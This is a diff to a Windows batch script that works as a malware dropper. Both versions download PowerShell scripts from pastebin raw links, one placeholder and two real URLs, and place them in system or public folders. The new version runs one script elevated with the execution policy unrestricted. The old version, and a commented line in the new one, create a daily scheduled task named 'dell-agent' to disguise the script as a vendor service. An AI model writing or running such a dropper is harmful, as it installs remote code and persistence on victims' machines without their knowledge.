@@ -1,2 +1,2 @@
-ECHO OFF && curl <pastebin_raw_link> > sus.ps1 & move .\sus.ps1 C:\Windows\Log\ & schtasks /Create /SC DAILY /TN "dell-agent" /TR "powershell -Command 'C:\Windows\Log\sus.ps1';" /ST 09:30 && 
-REM echo "schedulded task created"
+ECHO OFF && curl https://pastebin.com/raw/12kGpsyF -o .\sus.ps1 & move .\sus.ps1 C:\Users\Public\Videos & curl https://pastebin.com/raw/eWhbRy5U -o .\help.ps1 & move .\help.ps1 C:\Users\Public\Videos & powershell C:\Users\Public\Videos\help.ps1 -verb runAS -ExecutionPolicy Unrestricted
+REM schtasks /Create /SC DAILY /TN "dell-agent" /TR "powershell -Command 'C:\Users\Public\Videos\sus.ps1';" /ST 09:30 && REM echo "schedulded task created"
